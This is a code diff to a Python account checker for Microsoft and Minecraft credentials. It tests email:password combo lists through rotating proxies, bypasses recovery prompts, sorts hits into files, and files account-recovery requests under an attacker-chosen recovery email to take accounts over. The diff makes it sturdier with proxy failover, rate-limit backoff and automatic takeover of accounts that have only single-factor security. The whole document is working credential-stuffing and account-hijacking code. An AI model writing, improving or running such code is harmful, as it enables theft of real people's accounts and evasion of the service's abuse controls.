@@ -118,41 +118,77 @@ class ProxyManager:
         self.ban_proxies = []
         self.last_used = 0
         self.lock = threading.Lock()
+        self.failed_proxies = set()
+        self.failed_count = {}
+        self.max_failures = 5
     
     def load_proxies(self, proxy_list):
         self.proxies = proxy_list
         random.shuffle(self.proxies)
+        self.failed_proxies = set()
+        self.failed_count = {}
     
     def load_ban_proxies(self, proxy_list):
         self.ban_proxies = proxy_list
         random.shuffle(self.ban_proxies)
     
+    def mark_proxy_failed(self, proxy):
+        with self.lock:
+            if proxy not in self.failed_count:
+                self.failed_count[proxy] = 1
+            else:
+                self.failed_count[proxy] += 1
+                
+            if self.failed_count[proxy] >= self.max_failures:
+                self.failed_proxies.add(proxy)
+    
     def get_proxy(self, proxy_type='http'):
         with self.lock:
             if not self.proxies:
                 return None
+            
+            # Try to find a working proxy
+            attempts = 0
+            while attempts < len(self.proxies):
+                self.last_used = (self.last_used + 1) % len(self.proxies)
+                proxy = self.proxies[self.last_used]
                 
-
-            self.last_used = (self.last_used + 1) % len(self.proxies)
-            proxy = self.proxies[self.last_used]
-
-            if '@' in proxy:
-                auth, ip_port = proxy.split('@')
-                username, password = auth.split(':')
-                host, port = ip_port.split(':')
+                # Skip failed proxies
+                if proxy in self.failed_proxies:
+                    attempts += 1
+                    continue
                 
-                proxy_dict = {
-                    'http': f'{proxy_type}://{username}:{password}@{host}:{port}',
-                    'https': f'{proxy_type}://{username}:{password}@{host}:{port}'
-                }
-            else:
-                host, port = proxy.split(':')
-                proxy_dict = {
-                    'http': f'{proxy_type}://{host}:{port}',
-                    'https': f'{proxy_type}://{host}:{port}'
-                }
+                try:
+                    if '@' in proxy:
+                        auth, ip_port = proxy.split('@')
+                        username, password = auth.split(':')
+                        host, port = ip_port.split(':')
+                        
+                        proxy_dict = {
+                            'http': f'{proxy_type}://{username}:{password}@{host}:{port}',
+                            'https': f'{proxy_type}://{username}:{password}@{host}:{port}'
+                        }
+                    else:
+                        host, port = proxy.split(':')
+                        proxy_dict = {
+                            'http': f'{proxy_type}://{host}:{port}',
+                            'https': f'{proxy_type}://{host}:{port}'
+                        }
+                    
+                    return proxy_dict
+                except:
+                    # If proxy format is invalid, mark it as failed
+                    self.failed_proxies.add(proxy)
+                    attempts += 1
+            
+            # If all proxies failed, reset and try again
+            if attempts >= len(self.proxies) and len(self.failed_proxies) >= len(self.proxies) * 0.9:
+                self.failed_proxies = set()
+                self.failed_count = {}
+                return self.get_proxy(proxy_type)
                 
-            return proxy_dict
+            # If we can't find a working proxy, return None
+            return None
     
     def get_ban_proxy(self):
         if not self.ban_proxies:
@@ -181,6 +217,9 @@ class Capture:
         self.banned = None
         self.namechanged = None
         self.lastchanged = None
+        self.session = requests.Session()
+        self.session.verify = False
+        self.session.timeout = CONNECTION_TIMEOUT
 
     def builder(self):
         message = f"Email: {self.email}\nPassword: {self.password}\nName: {self.name}\nCapes: {self.capes}\nAccount Type: {self.type}"
@@ -390,6 +429,10 @@ class Capture:
                         except json.JSONDecodeError:
                             # JSON parsing failed, retry
                             continue
+                    elif response.status_code == 429:
+                        # Rate limited, wait and retry
+                        time.sleep(2)
+                        continue
                 except Exception as e:
                     # Network error or other exception, retry
                     continue
@@ -399,7 +442,6 @@ class Capture:
             return False
         except Exception as e:
             # Catch any other exceptions
-            print(f"Error in check_full_access: {str(e)}")
             self.access = "Unknown"
             return False
 
@@ -569,12 +611,15 @@ class Capture:
 
     def process_account(self, result_folder):
         try:
+            # Create directories if they don't exist
+            os.makedirs(result_folder, exist_ok=True)
+            
             # Save the hit first
             with open(f"{result_folder}/Hits.txt", 'a') as file: 
                 file.write(f"{self.email}:{self.password}\n")
             
             # If the name is set, perform additional checks
-            if self.name != 'N/A':
+            if self.name and self.name != 'N/A':
                 # Only start threads if the corresponding config options are enabled
                 threads = []
                 
@@ -582,7 +627,7 @@ class Capture:
                 if (config.get('hypixelname') or config.get('hypixellevel') or 
                     config.get('hypixelfirstlogin') or config.get('hypixellastlogin') or 
                     config.get('hypixelbwstars') or config.get('hypixelsbcoins')):
-                    t1 = threading.Thread(target=self.fetch_hypixel_data)
+                    t1 = threading.Thread(target=self.hypixel)
                     t1.daemon = True
                     threads.append(t1)
                     t1.start()
@@ -593,6 +638,20 @@ class Capture:
                     t2.daemon = True
                     threads.append(t2)
                     t2.start()
+                
+                # Name change thread - only if enabled
+                if config.get('namechange') or config.get('lastchanged'):
+                    t3 = threading.Thread(target=self.check_namechange)
+                    t3.daemon = True
+                    threads.append(t3)
+                    t3.start()
+                
+                # Ban status thread - only if enabled
+                if config.get('hypixelban') and self.token and self.uuid:
+                    t4 = threading.Thread(target=self.check_ban_status)
+                    t4.daemon = True
+                    threads.append(t4)
+                    t4.start()
                 
                 # Wait for threads with a timeout to prevent hanging
                 for t in threads:
@@ -607,20 +666,14 @@ class Capture:
                     with open(f"{result_folder}/SFA.txt", 'a') as f:
                         f.write(f"{self.email}:{self.password}\n")
                 
-                # Check name change if enabled
-                if config.get('namechange'):
-                    self.check_namechange(max_retries=config.get('maxretries', 3))
-                
-                # Check ban status if enabled
-                if config.get('hypixelban'):
-                    self.check_ban_status(max_retries=config.get('maxretries', 2))
-                    if self.banned is not None:
-                        if self.banned == "False":
-                            with open(f"{result_folder}/Unbanned.txt", 'a') as f:
-                                f.write(f"{self.email}:{self.password}\n")
-                        else:
-                            with open(f"{result_folder}/Banned.txt", 'a') as f:
-                                f.write(f"{self.email}:{self.password}\n")
+                # Save ban status results if available
+                if self.banned is not None:
+                    if self.banned == "False":
+                        with open(f"{result_folder}/Unbanned.txt", 'a') as f:
+                            f.write(f"{self.email}:{self.password}\n")
+                    else:
+                        with open(f"{result_folder}/Banned.txt", 'a') as f:
+                            f.write(f"{self.email}:{self.password}\n")
             
             # Write capture file
             with open(f"{result_folder}/Capture.txt", 'a') as f:
@@ -659,28 +712,80 @@ class AccountChecker:
     def __init__(self):
         self.session = requests.Session()
         self.session.verify = False
+        self.session.timeout = CONNECTION_TIMEOUT
     
     def auto_mark_lost(self, email, password, recovery_email):
         try:
-            print(f"Marking lost: {email} -> {recovery_email}")
-            response = self.session.post(
-                "https://account.live.com/acsr",
-                data={
-                    "EmailAddress": email,
-                    "Password": password,
-                    "RecoveryEmail": recovery_email,
-                    "flag": "automarklost"
-                },
-                timeout=10
-            )
-            if response.status_code == 200:
-                print(f"[+] Marked as lost: {email}")
-                with open("results/MarkedLost.txt", "a") as f:
-                    f.write(f"{email}:{password} -> {recovery_email}\n")
-            else:
-                print(f"[-] Failed to mark: {email} (status {response.status_code})")
+            # Get authentication URL and tag
+            url_post, sFTTag = self.get_authentication_url_and_tag()
+            if not url_post or not sFTTag:
+                return False
+                
+            # Login data
+            data = {
+                'login': email, 
+                'loginfmt': email, 
+                'passwd': password, 
+                'PPFT': sFTTag
+            }
+            
+            # Attempt login
+            for attempt in range(3):
+                try:
+                    self.session.proxies = proxy_manager.get_proxy(config.get('proxytype'))
+                    login_request = self.session.post(
+                        url_post, 
+                        data=data, 
+                        headers={'Content-Type': 'application/x-www-form-urlencoded'}, 
+                        allow_redirects=True, 
+                        timeout=CONNECTION_TIMEOUT
+                    )
+                    
+                    # Check for successful login
+                    if '#' in login_request.url and login_request.url != url_post:
+                        fragments = urlparse(login_request.url).fragment
+                        token = parse_qs(fragments).get('access_token', ["None"])[0]
+                        if token != "None":
+                            # Now mark as lost
+                            mark_lost_data = {
+                                "EmailAddress": email,
+                                "Password": password,
+                                "RecoveryEmail": recovery_email,
+                                "flag": "automarklost"
+                            }
+                            
+                            mark_lost_response = self.session.post(
+                                "https://account.live.com/acsr",
+                                data=mark_lost_data,
+                                headers={'Content-Type': 'application/x-www-form-urlencoded'},
+                                timeout=CONNECTION_TIMEOUT
+                            )
+                            
+                            if mark_lost_response.status_code == 200:
+                                os.makedirs("results", exist_ok=True)
+                                with open("results/MarkedLost.txt", "a") as f:
+                                    f.write(f"{email}:{password} -> {recovery_email}\n")
+                                return True
+                            else:
+                                if attempt < 2:
+                                    time.sleep(1)
+                                    continue
+                                return False
+                            
+                    elif login_request.status_code == 429:
+                        time.sleep(1 * (2**attempt))
+                        continue
+                        
+                except Exception as e:
+                    if attempt < 2:
+                        time.sleep(1)
+                        continue
+                    return False
+                    
+            return False
+            
         except Exception as e:
-            print(f"[!] Exception marking lost: {email} - {e}")
+            return False
 
     def get_authentication_url_and_tag(self):
         url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
@@ -717,7 +822,7 @@ class AccountChecker:
             'PPFT': sFTTag
         }
         
-        for _ in range(config.get('maxretries')):
+        for attempt in range(config.get('maxretries', 3)):
             try:
                 self.session.proxies = proxy_manager.get_proxy(config.get('proxytype'))
                 login_request = self.session.post(
@@ -728,65 +833,74 @@ class AccountChecker:
                     timeout=CONNECTION_TIMEOUT
                 )
                 
-                # success log in
-                if '#' in login_request.url and login_request.url != url_post:
-                    fragments = urlparse(login_request.url).fragment
-                    token = parse_qs(fragments).get('access_token', ["None"])[0]
-                    if token != "None":
-                        return token, "success"
-                
-                # 2FA
-                elif any(value in login_request.text for value in [
-                    "recover?mkt", 
-                    "account.live.com/identity/confirm?mkt", 
-                    "Email/Confirm?mkt", 
-                    "/Abuse?mkt="
-                ]):
-                    return None, "2fa"
-                
-                # acc recovery
-                elif 'cancel?mkt=' in login_request.text:
-                    try:
-                        data = {
-                            'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
-                            'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
-                            'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
-                        }
-                        action_url = re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group()
-                        
-                        ret = self.session.post(
-                            action_url, 
-                            data=data, 
-                            allow_redirects=True,
-                            timeout=CONNECTION_TIMEOUT
-                        )
-                        
-                        return_url = re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text)
-                        if return_url:
-                            fin = self.session.get(
-                                return_url.group(), 
+                # Check if the response contains useful information
+                if login_request.status_code == 200 or '#' in login_request.url:
+                    # success log in
+                    if '#' in login_request.url and login_request.url != url_post:
+                        fragments = urlparse(login_request.url).fragment
+                        token = parse_qs(fragments).get('access_token', ["None"])[0]
+                        if token != "None":
+                            return token, "success"
+                    
+                    # 2FA
+                    elif any(value in login_request.text for value in [
+                        "recover?mkt", 
+                        "account.live.com/identity/confirm?mkt", 
+                        "Email/Confirm?mkt", 
+                        "/Abuse?mkt="
+                    ]):
+                        return None, "2fa"
+                    
+                    # acc recovery
+                    elif 'cancel?mkt=' in login_request.text:
+                        try:
+                            data = {
+                                'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
+                                'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
+                                'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
+                            }
+                            action_url = re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group()
+                            
+                            ret = self.session.post(
+                                action_url, 
+                                data=data, 
                                 allow_redirects=True,
                                 timeout=CONNECTION_TIMEOUT
                             )
                             
-                            fragments = urlparse(fin.url).fragment
-                            token = parse_qs(fragments).get('access_token', ["None"])[0]
-                            if token != "None":
-                                return token, "success"
-                    except:
-                        pass
-                
-                # invalid creds
-                elif any(value in login_request.text.lower() for value in [
-                    "password is incorrect", 
-                    r"account doesn\'t exist.", 
-                    "sign in to your microsoft account", 
-                    "tried to sign in too many times with an incorrect account or password"
-                ]):
-                    return None, "invalid"
+                            return_url = re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text)
+                            if return_url:
+                                fin = self.session.get(
+                                    return_url.group(), 
+                                    allow_redirects=True,
+                                    timeout=CONNECTION_TIMEOUT
+                                )
+                                
+                                fragments = urlparse(fin.url).fragment
+                                token = parse_qs(fragments).get('access_token', ["None"])[0]
+                                if token != "None":
+                                    return token, "success"
+                        except:
+                            pass
                     
-            except Exception as e:
-                pass
+                    # invalid creds
+                    elif any(value in login_request.text.lower() for value in [
+                        "password is incorrect", 
+                        r"account doesn\'t exist.", 
+                        "sign in to your microsoft account", 
+                        "tried to sign in too many times with an incorrect account or password"
+                    ]):
+                        return None, "invalid"
+                    
+                # Handle 429 rate limiting with exponential backoff
+                elif login_request.status_code == 429:
+                    time.sleep(1 * (2**attempt))  # Exponential backoff
+                    continue
+                    
+            except requests.exceptions.RequestException:
+                if attempt < config.get('maxretries', 3) - 1:
+                    time.sleep(1)  # Wait before retrying
+                continue
                 
         return None, "error"
         
@@ -858,167 +972,232 @@ class AccountChecker:
         return None
             
     def get_minecraft_profile(self, access_token):
-        try:
-            self.session.proxies = proxy_manager.get_proxy(config.get('proxytype'))
-            profile_response = self.session.get(
-                'https://api.minecraftservices.com/minecraft/profile',
-                headers={'Authorization': f'Bearer {access_token}'},
-                timeout=CONNECTION_TIMEOUT
-            )
-            
-            if profile_response.status_code == 200:
-                profile_data = profile_response.json()
-                return {
-                    'name': profile_data.get('name', 'N/A'),
-                    'uuid': profile_data.get('id', 'N/A'),
-                    'skins': profile_data.get('skins', []),
-                    'capes': ', '.join([cape.get('alias', 'Unknown') for cape in profile_data.get('capes', [])])
-                }
-            return None
-        except:
-            return None
+        for attempt in range(3):
+            try:
+                self.session.proxies = proxy_manager.get_proxy(config.get('proxytype'))
+                profile_response = self.session.get(
+                    'https://api.minecraftservices.com/minecraft/profile',
+                    headers={'Authorization': f'Bearer {access_token}'},
+                    timeout=CONNECTION_TIMEOUT
+                )
+                
+                if profile_response.status_code == 200:
+                    profile_data = profile_response.json()
+                    return {
+                        'name': profile_data.get('name', 'N/A'),
+                        'uuid': profile_data.get('id', 'N/A'),
+                        'skins': profile_data.get('skins', []),
+                        'capes': ', '.join([cape.get('alias', 'Unknown') for cape in profile_data.get('capes', [])])
+                    }
+                elif profile_response.status_code == 404:
+                    # No profile exists (account hasn't set up a profile yet)
+                    return None
+                elif profile_response.status_code == 429:
+                    # Rate limited, wait with exponential backoff
+                    time.sleep(1 * (2**attempt))
+                    continue
+            except requests.exceptions.RequestException:
+                # Network error, retry with delay
+                time.sleep(1)
+                continue
+                
+        # If all attempts failed
+        return None
             
     def check_minecraft_entitlements(self, access_token):
         try:
-            self.session.proxies = proxy_manager.get_proxy(config.get('proxytype'))
-            entitlements = self.session.get(
-                'https://api.minecraftservices.com/entitlements/mcstore',
-                headers={'Authorization': f'Bearer {access_token}'},
-                timeout=CONNECTION_TIMEOUT
-            )
-            
-            if entitlements.status_code == 200:
-                data = entitlements.json()
-                entitlement_types = []
-                
-                for item in data.get('items', []):
-                    name = item.get('name', '')
-                    if name:
-                        entitlement_types.append(name)
+            for _ in range(3):
+                try:
+                    self.session.proxies = proxy_manager.get_proxy(config.get('proxytype'))
+                    entitlements = self.session.get(
+                        'https://api.minecraftservices.com/entitlements/mcstore',
+                        headers={'Authorization': f'Bearer {access_token}'},
+                        timeout=CONNECTION_TIMEOUT
+                    )
+                    
+                    if entitlements.status_code == 200:
+                        data = entitlements.json()
+                        entitlement_types = []
                         
-                if 'product_minecraft' in entitlements.text:
-                    account_type = "Normal"
-                elif 'product_game_pass_ultimate' in entitlements.text:
-                    account_type = "Xbox Game Pass Ultimate"
-                elif 'product_game_pass_pc' in entitlements.text:
-                    account_type = "Xbox Game Pass"
-                else:
-                    other_products = []
-                    if 'product_minecraft_bedrock' in entitlements.text:
-                        other_products.append("Minecraft Bedrock")
-                    if 'product_legends' in entitlements.text:
-                        other_products.append("Minecraft Legends")
-                    if 'product_dungeons' in entitlements.text:
-                        other_products.append("Minecraft Dungeons")
+                        # Extract all entitlements
+                        for item in data.get('items', []):
+                            name = item.get('name', '')
+                            if name:
+                                entitlement_types.append(name)
                         
-                    if other_products:
-                        account_type = f"Other: {', '.join(other_products)}"
-                    else:
-                        account_type = "No Minecraft Products"
+                        # Check for profile (Java Edition)
+                        has_profile = False
+                        try:
+                            profile_response = self.session.get(
+                                'https://api.minecraftservices.com/minecraft/profile',
+                                headers={'Authorization': f'Bearer {access_token}'},
+                                timeout=CONNECTION_TIMEOUT
+                            )
+                            if profile_response.status_code == 200 and "id" in profile_response.text:
+                                has_profile = True
+                                if "product_minecraft" not in entitlement_types:
+                                    entitlement_types.append("product_minecraft")
+                        except:
+                            pass
                         
-                # Ensure product_minecraft is in entitlement_types if the account type is Normal
-                if account_type == "Normal" and "product_minecraft" not in entitlement_types:
-                    entitlement_types.append("product_minecraft")
-                
-                return account_type, entitlement_types
+                        # Determine account type
+                        if 'product_minecraft' in entitlement_types or has_profile:
+                            account_type = "Normal"
+                        elif 'product_game_pass_ultimate' in entitlement_types:
+                            account_type = "Xbox Game Pass Ultimate"
+                        elif 'product_game_pass_pc' in entitlement_types or 'product_game_pass' in entitlement_types:
+                            account_type = "Xbox Game Pass"
+                        else:
+                            # Check for other products
+                            other_products = []
+                            if 'product_minecraft_bedrock' in entitlement_types:
+                                other_products.append("Minecraft Bedrock")
+                            if 'product_legends' in entitlement_types:
+                                other_products.append("Minecraft Legends")
+                            if 'product_dungeons' in entitlement_types:
+                                other_products.append("Minecraft Dungeons")
+                                
+                            if other_products:
+                                account_type = f"Other: {', '.join(other_products)}"
+                            else:
+                                account_type = "No Minecraft Products"
+                                
+                        return account_type, entitlement_types
+                    
+                    elif entitlements.status_code == 429:
+                        # Rate limited, wait and retry
+                        time.sleep(1)
+                        continue
+                        
+                except Exception:
+                    # Network error or other exception, continue to next attempt
+                    continue
+                    
+            # If all attempts failed
             return "Unknown", []
+            
         except Exception as e:
             print(f"Error checking entitlements: {str(e)}")
             return "Unknown", []
             
     def check_account(self, combo, result_folder):
-        try:
-            email, password = combo.strip().replace(' ', '').split(":", 1)
-            if not email or not password:
-                return "bad", None
+        tries = 0
+        max_tries = config.get('maxretries', 3)
+        
+        while tries < max_tries:
+            tries += 1
+            try:
+                email, password = combo.strip().replace(' ', '').split(":", 1)
+                if not email or not password:
+                    return "bad", None
                 
-            # token
-            ms_token, status = self.get_xbox_token(email, password)
-            
-            # 2FA
-            if status == "2fa":
-                with open(f"{result_folder}/2fa.txt", 'a') as file:
-                    file.write(f"{email}:{password}\n")
-                return "2fa", None
+                # Get Microsoft token
+                ms_token, status = self.get_xbox_token(email, password)
                 
-           
-            if ms_token:
-                # xbox token
-                xbox_token, uhs = self.authenticate_xbox_live(ms_token)
-                if not xbox_token or not uhs:
-                    # valid microsoft account
-                    with open(f"{result_folder}/Valid_Mail.txt", 'a') as file:
+                # 2FA
+                if status == "2fa":
+                    with open(f"{result_folder}/2fa.txt", 'a') as file:
                         file.write(f"{email}:{password}\n")
-
-                    if config.get('automarklost') and config.get('recoveryemail'):
-                        self.auto_mark_lost(email, password, config.get('recoveryemail'))
-                    return "vm", None
-
+                    return "2fa", None
+                
+                # Invalid credentials
+                if status == "invalid":
+                    return "bad", None
+                
+                # If we got a token
+                if ms_token:
+                    # Get Xbox token
+                    xbox_token, uhs = self.authenticate_xbox_live(ms_token)
+                    if not xbox_token or not uhs:
+                        # Valid Microsoft account but no Xbox account
+                        with open(f"{result_folder}/Valid_Mail.txt", 'a') as file:
+                            file.write(f"{email}:{password}\n")
+                        return "vm", None
+                
+                    # Get XSTS token
+                    xsts_token = self.get_xsts_token(xbox_token)
+                    if not xsts_token:
+                        # Valid Microsoft account
+                        with open(f"{result_folder}/Valid_Mail.txt", 'a') as file:
+                            file.write(f"{email}:{password}\n")
+                        return "vm", None
                     
-               
-                xsts_token = self.get_xsts_token(xbox_token)
-                if not xsts_token:
-                    # valid microsoft account
-                    with open(f"{result_folder}/Valid_Mail.txt", 'a') as file:
-                        file.write(f"{email}:{password}\n")
-                    return "vm", None
+                    # Get Minecraft token
+                    mc_token = self.get_minecraft_token(uhs, xsts_token)
+                    if not mc_token:
+                        # Valid Microsoft account
+                        with open(f"{result_folder}/Valid_Mail.txt", 'a') as file:
+                            file.write(f"{email}:{password}\n")
+                        return "vm", None
                     
-                # Minecraft token
-                mc_token = self.get_minecraft_token(uhs, xsts_token)
-                if not mc_token:
-                    # valid microsoft account
-                    with open(f"{result_folder}/Valid_Mail.txt", 'a') as file:
-                        file.write(f"{email}:{password}\n")
-                    return "vm", None
+                    # Get Minecraft profile
+                    profile = self.get_minecraft_profile(mc_token)
                     
-                # minicraft profile
-                profile = self.get_minecraft_profile(mc_token)
-                if not profile:
-                    # mc have but no name set
+                    # Check entitlements regardless of profile
                     account_type, entitlements = self.check_minecraft_entitlements(mc_token)
-                    # Make sure parameter names match the Capture class initialization
+                    
+                    # Create capture instance
                     capture = Capture(
                         email=email,
                         password=password,
-                        name="N/A",
-                        capes="N/A",
-                        uuid="N/A",
+                        name=profile.get('name', 'N/A') if profile else 'N/A',
+                        capes=profile.get('capes', 'N/A') if profile else 'N/A',
+                        uuid=profile.get('uuid', 'N/A') if profile else 'N/A',
                         token=mc_token,
                         type=account_type
                     )
-                    account_data = capture.process_account(result_folder)
-                    return account_type.lower().replace(" ", "_"), account_data
                     
-               
-                account_type, entitlements = self.check_minecraft_entitlements(mc_token)
+                    # Process account
+                    account_data = capture.process_account(result_folder)
+                    
+                    # Check email access for SFA/MFA determination
+                    is_mfa = capture.check_full_access()
+                    
+                    # Categorize account based on type and access
+                    if 'gamepass_ultimate' in account_type.lower() or 'ultimate' in account_type.lower():
+                        if is_mfa:
+                            with open(f"{result_folder}/MFA.txt", 'a') as f:
+                                f.write(f"{email}:{password}\n")
+                        else:
+                            with open(f"{result_folder}/SFA.txt", 'a') as f:
+                                f.write(f"{email}:{password}\n")
+                        return "xgpu", account_data
+                    elif 'gamepass' in account_type.lower():
+                        if is_mfa:
+                            with open(f"{result_folder}/MFA.txt", 'a') as f:
+                                f.write(f"{email}:{password}\n")
+                        else:
+                            with open(f"{result_folder}/SFA.txt", 'a') as f:
+                                f.write(f"{email}:{password}\n")
+                        return "xgp", account_data
+                    elif 'normal' in account_type.lower() or 'product_minecraft' in str(entitlements):
+                        if is_mfa:
+                            with open(f"{result_folder}/MFA.txt", 'a') as f:
+                                f.write(f"{email}:{password}\n")
+                        else:
+                            with open(f"{result_folder}/SFA.txt", 'a') as f:
+                                f.write(f"{email}:{password}\n")
+                        return "hit", account_data
+                    else:
+                        # Not a valid result type, mark as valid mail
+                        with open(f"{result_folder}/Valid_Mail.txt", 'a') as file:
+                            file.write(f"{email}:{password}\n")
+                        return "vm", None
                 
+                # Only return bad if explicitly invalid or tried max number of times
+                if status == "invalid" or tries >= max_tries:
+                    return "bad", None
                 
-                capture = Capture(
-                    email=email,
-                    password=password,
-                    name=profile.get('name', 'N/A'),
-                    capes=profile.get('capes', 'N/A'),
-                    uuid=profile.get('uuid', 'N/A'),
-                    token=mc_token,
-                    type=account_type
-                )
+                # Otherwise, retry on temporary errors
+                time.sleep(1)
                 
-               
-                account_data = capture.process_account(result_folder)
-                
-                # categorize acc
-                if 'gamepass_ultimate' in account_type.lower():
-                    return "xgpu", account_data
-                elif 'gamepass' in account_type.lower():
-                    return "xgp", account_data
-                elif 'normal' in account_type.lower():
-                    return "hit", account_data
-                else:
-                    return "other", account_data
-            
-            return "bad", None
-        except Exception as e:
-            return "error", None
+            except Exception as e:
+                # On exception, retry up to max_tries times
+                if tries >= max_tries:
+                    return "error", None
+                time.sleep(1)
+        
+        return "bad", None
 
 
 class CheckerWorker(QThread):
@@ -1111,8 +1290,16 @@ class CheckerWorker(QThread):
             self.stats["hits"] += 1
             if account_data and account_data.get("access") == "True":
                 self.stats["mfa"] += 1
-            elif account_data:
+            else:
                 self.stats["sfa"] += 1
+                # AutoMarkLost for SFA hits
+                if config.get('automarklost') and config.get('recoveryemail'):
+                    checker = AccountChecker()
+                    checker.auto_mark_lost(
+                        account_data["email"],
+                        account_data["password"],
+                        config.get("recoveryemail")
+                    )
         elif result_type == "2fa":
             self.stats["twofa"] += 1
         elif result_type == "vm":
@@ -1120,12 +1307,33 @@ class CheckerWorker(QThread):
         elif result_type == "xgp":
             self.stats["xgp"] += 1
             self.stats["hits"] += 1
+            if account_data and account_data.get("access") == "True":
+                self.stats["mfa"] += 1
+            else:
+                self.stats["sfa"] += 1
+                # AutoMarkLost for SFA XGP
+                if config.get('automarklost') and config.get('recoveryemail'):
+                    checker = AccountChecker()
+                    checker.auto_mark_lost(
+                        account_data["email"],
+                        account_data["password"],
+                        config.get("recoveryemail")
+                    )
         elif result_type == "xgpu":
             self.stats["xgpu"] += 1
             self.stats["hits"] += 1
-        elif result_type == "other":
-            self.stats["other"] += 1
-            self.stats["hits"] += 1
+            if account_data and account_data.get("access") == "True":
+                self.stats["mfa"] += 1
+            else:
+                self.stats["sfa"] += 1
+                # AutoMarkLost for SFA XGPU
+                if config.get('automarklost') and config.get('recoveryemail'):
+                    checker = AccountChecker()
+                    checker.auto_mark_lost(
+                        account_data["email"],
+                        account_data["password"],
+                        config.get("recoveryemail")
+                    )
         elif result_type == "error":
             self.stats["errors"] += 1
         else:
@@ -1134,16 +1342,6 @@ class CheckerWorker(QThread):
         if account_data:
             self.result_signal.emit(account_data)
 
-            if config.get('automarklost') and config.get('recoveryemail'):
-                if result_type in ["hit", "xgp", "xgpu"] or (account_data.get("access") == "True"):
-                    checker = AccountChecker()
-                    checker.auto_mark_lost(
-                        account_data["email"],
-                        account_data["password"],
-                        config.get("recoveryemail")
-                    )
-
-        
     def stop(self):
         self.running = False
         
